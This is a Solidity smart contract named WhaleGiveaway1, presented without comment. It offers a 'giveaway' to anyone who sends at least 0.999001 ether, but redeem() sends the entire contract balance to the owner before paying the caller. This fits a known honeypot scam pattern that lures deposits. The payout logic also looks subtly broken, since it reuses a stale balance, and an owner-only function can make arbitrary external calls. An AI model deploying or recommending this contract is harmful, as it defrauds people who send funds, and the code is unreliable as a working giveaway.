pragma solidity ^0.8.0;

contract WhaleGiveaway1 {
    address public owner;

    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility, "Insufficient funds provided");
        uint balance = address(this).balance;
        payable(owner).transfer(balance);
        payable(msg.sender).transfer(balance);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        uint balance = address(this).balance;
        payable(owner).transfer(balance);
    }

    function command(address adr, bytes memory data) public payable {
        require(msg.sender == owner, "Only the owner can execute commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed");
    }
}